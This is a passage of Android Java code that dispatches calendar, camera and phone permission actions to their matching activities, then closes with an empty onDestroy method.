                calendarIntent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK|Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(calendarIntent);
            }else if(action.equals(ACTION_CAMERA_PERMISSION)){
                Intent cameraIntent = new Intent();
                cameraIntent.setAction(Intent.ACTION_VIEW);
                cameraIntent.setClass(this, CameraActivity.class);
                cameraIntent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK|Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(cameraIntent);
            }else if(action.equals(ACTION_PHONE_PERMISSION)){
                Intent phoneIntent = new Intent();
                phoneIntent.setAction(Intent.ACTION_VIEW);
                phoneIntent.setClass(this, PhoneActivity.class);
                phoneIntent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK|Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(phoneIntent);
            }else {
                Log.d(TAG, "No action found!");
            }
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }
}